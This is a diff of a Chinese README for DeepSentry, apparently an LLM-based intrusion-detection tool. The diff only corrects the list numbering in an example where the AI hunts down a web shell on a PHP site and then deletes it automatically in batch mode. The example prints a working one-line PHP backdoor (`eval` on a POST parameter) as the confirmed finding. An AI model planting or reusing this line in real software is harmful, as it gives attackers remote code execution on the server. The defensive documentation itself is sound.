@@ -125,16 +125,16 @@ DeepSentry 内置了基于大语言模型（LLM）的决策大脑，能够理解
 
 - *AI 发现*: 扫描结果包含大量误报（如 `jquery.uploadify` 和 CMS 核心文件）。
 
-1. **策略调整 (Pivot)**: AI 分析认为基于签名的搜索噪声太大，决定转向**行为分析**——查找最近 30 天内被修改过的 PHP 文件。
+2. **策略调整 (Pivot)**: AI 分析认为基于签名的搜索噪声太大，决定转向**行为分析**——查找最近 30 天内被修改过的 PHP 文件。
 
 - *Command*: `find ... -mtime -30 ...`
 
-1. **锁定目标**: 发现可疑文件 `/var/www/html/protected/apps/member/hacker.php`。
-2. **取证分析**: 读取文件内容进行确认。
+3. **锁定目标**: 发现可疑文件 `/var/www/html/protected/apps/member/hacker.php`。
+4. **取证分析**: 读取文件内容进行确认。
 
 - *Result*: `<?php @eval($_POST['hacker']); ?>` (确认为一句话木马)。
 
-1. **自动处置**: 在 Batch 模式下，AI 决定立即删除威胁。
+5. **自动处置**: 在 Batch 模式下，AI 决定立即删除威胁。
 
 - *Command*: `rm .../hacker.php`
 
